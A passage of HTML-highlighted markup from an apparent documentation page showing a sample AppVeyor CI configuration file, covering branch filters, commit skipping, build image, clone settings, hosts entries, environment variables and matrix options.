&lt;/span>&lt;span class="lnt">117
&lt;/span>&lt;span class="lnt">118
&lt;/span>&lt;span class="lnt">119
&lt;/span>&lt;span class="lnt">120
&lt;/span>&lt;span class="lnt">121
&lt;/span>&lt;span class="lnt">122
&lt;/span>&lt;span class="lnt">123
&lt;/span>&lt;span class="lnt">124
&lt;/span>&lt;span class="lnt">125
&lt;/span>&lt;span class="lnt">126
&lt;/span>&lt;span class="lnt">127
&lt;/span>&lt;span class="lnt">128
&lt;/span>&lt;span class="lnt">129
&lt;/span>&lt;span class="lnt">130
&lt;/span>&lt;span class="lnt">131
&lt;/span>&lt;span class="lnt">132
&lt;/span>&lt;span class="lnt">133
&lt;/span>&lt;span class="lnt">134
&lt;/span>&lt;span class="lnt">135
&lt;/span>&lt;span class="lnt">136
&lt;/span>&lt;span class="lnt">137
&lt;/span>&lt;span class="lnt">138
&lt;/span>&lt;span class="lnt">139
&lt;/span>&lt;span class="lnt">140
&lt;/span>&lt;span class="lnt">141
&lt;/span>&lt;span class="lnt">142
&lt;/span>&lt;span class="lnt">143
&lt;/span>&lt;span class="lnt">144
&lt;/span>&lt;span class="lnt">145
&lt;/span>&lt;span class="lnt">146
&lt;/span>&lt;span class="lnt">147
&lt;/span>&lt;span class="lnt">148
&lt;/span>&lt;span class="lnt">149
&lt;/span>&lt;span class="lnt">150
&lt;/span>&lt;span class="lnt">151
&lt;/span>&lt;span class="lnt">152
&lt;/span>&lt;span class="lnt">153
&lt;/span>&lt;span class="lnt">154
&lt;/span>&lt;span class="lnt">155
&lt;/span>&lt;span class="lnt">156
&lt;/span>&lt;span class="lnt">157
&lt;/span>&lt;span class="lnt">158
&lt;/span>&lt;span class="lnt">159
&lt;/span>&lt;span class="lnt">160
&lt;/span>&lt;span class="lnt">161
&lt;/span>&lt;span class="lnt">162
&lt;/span>&lt;span class="lnt">163
&lt;/span>&lt;span class="lnt">164
&lt;/span>&lt;span class="lnt">165
&lt;/span>&lt;span class="lnt">166
&lt;/span>&lt;span class="lnt">167
&lt;/span>&lt;span class="lnt">168
&lt;/span>&lt;span class="lnt">169
&lt;/span>&lt;span class="lnt">170
&lt;/span>&lt;span class="lnt">171
&lt;/span>&lt;span class="lnt">172
&lt;/span>&lt;span class="lnt">173
&lt;/span>&lt;span class="lnt">174
&lt;/span>&lt;span class="lnt">175
&lt;/span>&lt;span class="lnt">176
&lt;/span>&lt;span class="lnt">177
&lt;/span>&lt;span class="lnt">178
&lt;/span>&lt;span class="lnt">179
&lt;/span>&lt;span class="lnt">180
&lt;/span>&lt;span class="lnt">181
&lt;/span>&lt;span class="lnt">182
&lt;/span>&lt;span class="lnt">183
&lt;/span>&lt;span class="lnt">184
&lt;/span>&lt;span class="lnt">185
&lt;/span>&lt;span class="lnt">186
&lt;/span>&lt;span class="lnt">187
&lt;/span>&lt;span class="lnt">188
&lt;/span>&lt;span class="lnt">189
&lt;/span>&lt;span class="lnt">190
&lt;/span>&lt;span class="lnt">191
&lt;/span>&lt;span class="lnt">192
&lt;/span>&lt;span class="lnt">193
&lt;/span>&lt;span class="lnt">194
&lt;/span>&lt;span class="lnt">195
&lt;/span>&lt;span class="lnt">196
&lt;/span>&lt;span class="lnt">197
&lt;/span>&lt;span class="lnt">198
&lt;/span>&lt;span class="lnt">199
&lt;/span>&lt;span class="lnt">200
&lt;/span>&lt;span class="lnt">201
&lt;/span>&lt;span class="lnt">202
&lt;/span>&lt;span class="lnt">203
&lt;/span>&lt;span class="lnt">204
&lt;/span>&lt;span class="lnt">205
&lt;/span>&lt;span class="lnt">206
&lt;/span>&lt;span class="lnt">207
&lt;/span>&lt;span class="lnt">208
&lt;/span>&lt;span class="lnt">209
&lt;/span>&lt;span class="lnt">210
&lt;/span>&lt;span class="lnt">211
&lt;/span>&lt;span class="lnt">212
&lt;/span>&lt;span class="lnt">213
&lt;/span>&lt;span class="lnt">214
&lt;/span>&lt;span class="lnt">215
&lt;/span>&lt;span class="lnt">216
&lt;/span>&lt;span class="lnt">217
&lt;/span>&lt;span class="lnt">218
&lt;/span>&lt;span class="lnt">219
&lt;/span>&lt;span class="lnt">220
&lt;/span>&lt;span class="lnt">221
&lt;/span>&lt;span class="lnt">222
&lt;/span>&lt;span class="lnt">223
&lt;/span>&lt;span class="lnt">224
&lt;/span>&lt;span class="lnt">225
&lt;/span>&lt;span class="lnt">226
&lt;/span>&lt;span class="lnt">227
&lt;/span>&lt;span class="lnt">228
&lt;/span>&lt;span class="lnt">229
&lt;/span>&lt;span class="lnt">230
&lt;/span>&lt;span class="lnt">231
&lt;/span>&lt;span class="lnt">232
&lt;/span>&lt;span class="lnt">233
&lt;/span>&lt;span class="lnt">234
&lt;/span>&lt;span class="lnt">235
&lt;/span>&lt;span class="lnt">236
&lt;/span>&lt;span class="lnt">237
&lt;/span>&lt;span class="lnt">238
&lt;/span>&lt;span class="lnt">239
&lt;/span>&lt;span class="lnt">240
&lt;/span>&lt;span class="lnt">241
&lt;/span>&lt;span class="lnt">242
&lt;/span>&lt;span class="lnt">243
&lt;/span>&lt;span class="lnt">244
&lt;/span>&lt;span class="lnt">245
&lt;/span>&lt;span class="lnt">246
&lt;/span>&lt;span class="lnt">247
&lt;/span>&lt;span class="lnt">248
&lt;/span>&lt;span class="lnt">249
&lt;/span>&lt;span class="lnt">250
&lt;/span>&lt;span class="lnt">251
&lt;/span>&lt;span class="lnt">252
&lt;/span>&lt;span class="lnt">253
&lt;/span>&lt;span class="lnt">254
&lt;/span>&lt;span class="lnt">255
&lt;/span>&lt;span class="lnt">256
&lt;/span>&lt;span class="lnt">257
&lt;/span>&lt;span class="lnt">258
&lt;/span>&lt;span class="lnt">259
&lt;/span>&lt;span class="lnt">260
&lt;/span>&lt;span class="lnt">261
&lt;/span>&lt;span class="lnt">262
&lt;/span>&lt;span class="lnt">263
&lt;/span>&lt;span class="lnt">264
&lt;/span>&lt;span class="lnt">265
&lt;/span>&lt;span class="lnt">266
&lt;/span>&lt;span class="lnt">267
&lt;/span>&lt;span class="lnt">268
&lt;/span>&lt;span class="lnt">269
&lt;/span>&lt;span class="lnt">270
&lt;/span>&lt;span class="lnt">271
&lt;/span>&lt;span class="lnt">272
&lt;/span>&lt;span class="lnt">273
&lt;/span>&lt;span class="lnt">274
&lt;/span>&lt;span class="lnt">275
&lt;/span>&lt;span class="lnt">276
&lt;/span>&lt;span class="lnt">277
&lt;/span>&lt;span class="lnt">278
&lt;/span>&lt;span class="lnt">279
&lt;/span>&lt;span class="lnt">280
&lt;/span>&lt;span class="lnt">281
&lt;/span>&lt;span class="lnt">282
&lt;/span>&lt;span class="lnt">283
&lt;/span>&lt;span class="lnt">284
&lt;/span>&lt;span class="lnt">285
&lt;/span>&lt;span class="lnt">286
&lt;/span>&lt;span class="lnt">287
&lt;/span>&lt;span class="lnt">288
&lt;/span>&lt;span class="lnt">289
&lt;/span>&lt;span class="lnt">290
&lt;/span>&lt;span class="lnt">291
&lt;/span>&lt;span class="lnt">292
&lt;/span>&lt;span class="lnt">293
&lt;/span>&lt;span class="lnt">294
&lt;/span>&lt;span class="lnt">295
&lt;/span>&lt;span class="lnt">296
&lt;/span>&lt;span class="lnt">297
&lt;/span>&lt;span class="lnt">298
&lt;/span>&lt;span class="lnt">299
&lt;/span>&lt;span class="lnt">300
&lt;/span>&lt;span class="lnt">301
&lt;/span>&lt;span class="lnt">302
&lt;/span>&lt;span class="lnt">303
&lt;/span>&lt;span class="lnt">304
&lt;/span>&lt;span class="lnt">305
&lt;/span>&lt;span class="lnt">306
&lt;/span>&lt;span class="lnt">307
&lt;/span>&lt;span class="lnt">308
&lt;/span>&lt;span class="lnt">309
&lt;/span>&lt;span class="lnt">310
&lt;/span>&lt;span class="lnt">311
&lt;/span>&lt;span class="lnt">312
&lt;/span>&lt;span class="lnt">313
&lt;/span>&lt;span class="lnt">314
&lt;/span>&lt;span class="lnt">315
&lt;/span>&lt;span class="lnt">316
&lt;/span>&lt;span class="lnt">317
&lt;/span>&lt;span class="lnt">318
&lt;/span>&lt;span class="lnt">319
&lt;/span>&lt;span class="lnt">320
&lt;/span>&lt;span class="lnt">321
&lt;/span>&lt;span class="lnt">322
&lt;/span>&lt;span class="lnt">323
&lt;/span>&lt;span class="lnt">324
&lt;/span>&lt;span class="lnt">325
&lt;/span>&lt;span class="lnt">326
&lt;/span>&lt;span class="lnt">327
&lt;/span>&lt;span class="lnt">328
&lt;/span>&lt;span class="lnt">329
&lt;/span>&lt;span class="lnt">330
&lt;/span>&lt;span class="lnt">331
&lt;/span>&lt;span class="lnt">332
&lt;/span>&lt;span class="lnt">333
&lt;/span>&lt;span class="lnt">334
&lt;/span>&lt;span class="lnt">335
&lt;/span>&lt;span class="lnt">336
&lt;/span>&lt;span class="lnt">337
&lt;/span>&lt;span class="lnt">338
&lt;/span>&lt;span class="lnt">339
&lt;/span>&lt;span class="lnt">340
&lt;/span>&lt;span class="lnt">341
&lt;/span>&lt;span class="lnt">342
&lt;/span>&lt;span class="lnt">343
&lt;/span>&lt;span class="lnt">344
&lt;/span>&lt;span class="lnt">345
&lt;/span>&lt;span class="lnt">346
&lt;/span>&lt;span class="lnt">347
&lt;/span>&lt;span class="lnt">348
&lt;/span>&lt;span class="lnt">349
&lt;/span>&lt;span class="lnt">350
&lt;/span>&lt;span class="lnt">351
&lt;/span>&lt;span class="lnt">352
&lt;/span>&lt;span class="lnt">353
&lt;/span>&lt;span class="lnt">354
&lt;/span>&lt;span class="lnt">355
&lt;/span>&lt;span class="lnt">356
&lt;/span>&lt;span class="lnt">357
&lt;/span>&lt;span class="lnt">358
&lt;/span>&lt;span class="lnt">359
&lt;/span>&lt;span class="lnt">360
&lt;/span>&lt;span class="lnt">361
&lt;/span>&lt;span class="lnt">362
&lt;/span>&lt;span class="lnt">363
&lt;/span>&lt;span class="lnt">364
&lt;/span>&lt;span class="lnt">365
&lt;/span>&lt;span class="lnt">366
&lt;/span>&lt;span class="lnt">367
&lt;/span>&lt;span class="lnt">368
&lt;/span>&lt;span class="lnt">369
&lt;/span>&lt;span class="lnt">370
&lt;/span>&lt;span class="lnt">371
&lt;/span>&lt;span class="lnt">372
&lt;/span>&lt;span class="lnt">373
&lt;/span>&lt;span class="lnt">374
&lt;/span>&lt;span class="lnt">375
&lt;/span>&lt;span class="lnt">376
&lt;/span>&lt;span class="lnt">377
&lt;/span>&lt;span class="lnt">378
&lt;/span>&lt;span class="lnt">379
&lt;/span>&lt;span class="lnt">380
&lt;/span>&lt;span class="lnt">381
&lt;/span>&lt;span class="lnt">382
&lt;/span>&lt;span class="lnt">383
&lt;/span>&lt;span class="lnt">384
&lt;/span>&lt;span class="lnt">385
&lt;/span>&lt;span class="lnt">386
&lt;/span>&lt;span class="lnt">387
&lt;/span>&lt;span class="lnt">388
&lt;/span>&lt;span class="lnt">389
&lt;/span>&lt;span class="lnt">390
&lt;/span>&lt;span class="lnt">391
&lt;/span>&lt;span class="lnt">392
&lt;/span>&lt;span class="lnt">393
&lt;/span>&lt;span class="lnt">394
&lt;/span>&lt;span class="lnt">395
&lt;/span>&lt;span class="lnt">396
&lt;/span>&lt;span class="lnt">397
&lt;/span>&lt;span class="lnt">398
&lt;/span>&lt;span class="lnt">399
&lt;/span>&lt;span class="lnt">400
&lt;/span>&lt;span class="lnt">401
&lt;/span>&lt;span class="lnt">402
&lt;/span>&lt;span class="lnt">403
&lt;/span>&lt;span class="lnt">404
&lt;/span>&lt;span class="lnt">405
&lt;/span>&lt;span class="lnt">406
&lt;/span>&lt;span class="lnt">407
&lt;/span>&lt;span class="lnt">408
&lt;/span>&lt;span class="lnt">409
&lt;/span>&lt;span class="lnt">410
&lt;/span>&lt;span class="lnt">411
&lt;/span>&lt;span class="lnt">412
&lt;/span>&lt;span class="lnt">413
&lt;/span>&lt;span class="lnt">414
&lt;/span>&lt;span class="lnt">415
&lt;/span>&lt;span class="lnt">416
&lt;/span>&lt;span class="lnt">417
&lt;/span>&lt;span class="lnt">418
&lt;/span>&lt;span class="lnt">419
&lt;/span>&lt;span class="lnt">420
&lt;/span>&lt;span class="lnt">421
&lt;/span>&lt;span class="lnt">422
&lt;/span>&lt;span class="lnt">423
&lt;/span>&lt;span class="lnt">424
&lt;/span>&lt;span class="lnt">425
&lt;/span>&lt;span class="lnt">426
&lt;/span>&lt;span class="lnt">427
&lt;/span>&lt;span class="lnt">428
&lt;/span>&lt;span class="lnt">429
&lt;/span>&lt;span class="lnt">430
&lt;/span>&lt;span class="lnt">431
&lt;/span>&lt;span class="lnt">432
&lt;/span>&lt;span class="lnt">433
&lt;/span>&lt;span class="lnt">434
&lt;/span>&lt;span class="lnt">435
&lt;/span>&lt;span class="lnt">436
&lt;/span>&lt;span class="lnt">437
&lt;/span>&lt;span class="lnt">438
&lt;/span>&lt;span class="lnt">439
&lt;/span>&lt;span class="lnt">440
&lt;/span>&lt;span class="lnt">441
&lt;/span>&lt;span class="lnt">442
&lt;/span>&lt;span class="lnt">443
&lt;/span>&lt;span class="lnt">444
&lt;/span>&lt;span class="lnt">445
&lt;/span>&lt;span class="lnt">446
&lt;/span>&lt;span class="lnt">447
&lt;/span>&lt;span class="lnt">448
&lt;/span>&lt;span class="lnt">449
&lt;/span>&lt;span class="lnt">450
&lt;/span>&lt;span class="lnt">451
&lt;/span>&lt;span class="lnt">452
&lt;/span>&lt;span class="lnt">453
&lt;/span>&lt;span class="lnt">454
&lt;/span>&lt;span class="lnt">455
&lt;/span>&lt;span class="lnt">456
&lt;/span>&lt;span class="lnt">457
&lt;/span>&lt;span class="lnt">458
&lt;/span>&lt;span class="lnt">459
&lt;/span>&lt;span class="lnt">460
&lt;/span>&lt;span class="lnt">461
&lt;/span>&lt;span class="lnt">462
&lt;/span>&lt;span class="lnt">463
&lt;/span>&lt;span class="lnt">464
&lt;/span>&lt;span class="lnt">465
&lt;/span>&lt;span class="lnt">466
&lt;/span>&lt;span class="lnt">467
&lt;/span>&lt;span class="lnt">468
&lt;/span>&lt;span class="lnt">469
&lt;/span>&lt;span class="lnt">470
&lt;/span>&lt;span class="lnt">471
&lt;/span>&lt;span class="lnt">472
&lt;/span>&lt;span class="lnt">473
&lt;/span>&lt;span class="lnt">474
&lt;/span>&lt;span class="lnt">475
&lt;/span>&lt;span class="lnt">476
&lt;/span>&lt;span class="lnt">477
&lt;/span>&lt;span class="lnt">478
&lt;/span>&lt;span class="lnt">479
&lt;/span>&lt;span class="lnt">480
&lt;/span>&lt;span class="lnt">481
&lt;/span>&lt;span class="lnt">482
&lt;/span>&lt;span class="lnt">483
&lt;/span>&lt;span class="lnt">484
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre class="chroma">&lt;code class="language-yml" data-lang="yml">&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="c"># Notes:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="c"># - Minimal appveyor.yml file is an empty file. All sections are optional.&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="c"># - Indent each level of configuration with 2 spaces. Do not use tabs!&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="c"># - All section names are case-sensitive.&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="c"># - Section names should be unique on each level.&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="c">#---------------------------------#&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="c"># general configuration #&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="c">#---------------------------------#&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="c"># version format&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="nt">version&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="m">1.0&lt;/span>&lt;span class="l">.{build}&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="c"># you can use {branch} name in version format too&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="c"># version: 1.0.{build}-{branch}&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="c"># branches to build&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="nt">branches&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="c"># whitelist&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">only&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>- &lt;span class="l">master&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>- &lt;span class="l">production&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="c"># blacklist&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">except&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>- &lt;span class="l">gh-pages&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="c"># Do not build on tags (GitHub, Bitbucket, GitLab, Gitea)&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="nt">skip_tags&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="kc">true&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="c"># Start builds on tags only (GitHub, BitBucket, GitLab, Gitea)&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="nt">skip_non_tags&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="kc">true&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="c"># Skipping commits with particular message or from specific user&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="nt">skip_commits&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">message&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">/Created.*\.(png|jpg|jpeg|bmp|gif)/ &lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="c"># Regex for matching commit message&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">author&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">John &lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="c"># Commit author&amp;#39;s username, name, email or regexp maching one of these.&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="c"># Including commits with particular message or from specific user&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="nt">only_commits&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">message&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">/build/ &lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="c"># Start a new build if message contains &amp;#39;build&amp;#39;&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">author&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">jack@company.com &lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="c"># Start a new build for commit of user with email jack@company.com&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="c"># Skipping commits affecting specific files (GitHub only). More details here: /docs/appveyor-yml&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="c">#skip_commits:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="c"># files:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="c"># - docs/*&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="c"># - &amp;#39;**/*.html&amp;#39;&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="c"># Including commits affecting specific files (GitHub only). More details here: /docs/appveyor-yml&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="c">#only_commits:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="c"># files:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="c"># - Project-A/&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="c"># - Project-B/&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="c"># Do not build feature branch with open Pull Requests&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="nt">skip_branch_with_pr&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="kc">true&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="c"># Maximum number of concurrent jobs for the project&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="nt">max_jobs&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="m">1&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="c">#---------------------------------#&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="c"># environment configuration #&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="c">#---------------------------------#&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="c"># Build worker image (VM template)&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="nt">image&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">Visual Studio 2015&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="c"># scripts that are called at very beginning, before repo cloning&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="nt">init&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>- &lt;span class="l">git config --global core.autocrlf input&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="c"># clone directory&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="nt">clone_folder&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">c:\projects\myproject&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="c"># fetch repository as zip archive&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="nt">shallow_clone&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="kc">true&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="c"># default is &amp;#34;false&amp;#34;&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="c"># set clone depth&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="nt">clone_depth&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="m">5&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="c"># clone entire repository history if not defined&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="c"># setting up etc\hosts file&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="nt">hosts&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">queue-server&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="m">127.0.0.1&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">db.server.com&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="m">127.0.0.2&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="c"># environment variables&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="nt">environment&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">my_var1&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">value1&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">my_var2&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">value2&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="c"># this is how to set encrypted variable. Go to &amp;#34;Settings&amp;#34; -&amp;gt; &amp;#34;Encrypt YAML&amp;#34; page in account menu to encrypt data.&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">my_secure_var1&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">secure&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">FW3tJ3fMncxvs58/ifSP7w==&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="c"># environment:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="c"># global:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="c"># connection_string: server=12;password=13;&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="c"># service_url: https://127.0.0.1:8090&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="c">#&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="c"># matrix:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="c"># - db: mysql&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="c"># provider: mysql&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="c">#&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="c"># - db: mssql&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="c"># provider: mssql&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="c"># password:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="c"># secure: $#(JFDA)jQ@#$&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="c"># this is how to allow failing jobs in the matrix&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="nt">matrix&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">fast_finish&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="kc">true&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="c"># set this flag to immediately finish build once one of the jobs fails.&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">allow_failures&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>- &lt;span class="nt">platform&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">x86&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">configuration&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">Debug&lt;/span>&lt;span class="w">
